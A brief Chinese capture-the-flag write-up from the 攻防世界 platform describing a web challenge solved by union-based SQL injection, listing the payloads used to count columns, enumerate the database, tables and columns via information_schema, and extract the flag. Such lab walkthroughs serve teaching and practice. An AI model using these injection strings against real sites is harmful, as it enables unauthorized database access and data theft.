WEB

题目来源：攻防世界

拿到题首先看源码，发现存在一个form表单。

这种表单很容易想到sql注入和xss，先判断注入点，一般为’或”

1’页面崩溃则存在SQL注入

1’ order by 3# 判断显位

1’ union select 1,2,database()# 爆库

1’ union select 1,2,table_name from information_schema.tables where table_schema=‘news’# 爆表

1’ union select 1,2,column_name from information_schema.columns
where table_name=‘secret_table’# 爆字段

1’ union select 1,id,fl4g from secret_table# 发现flag 查询
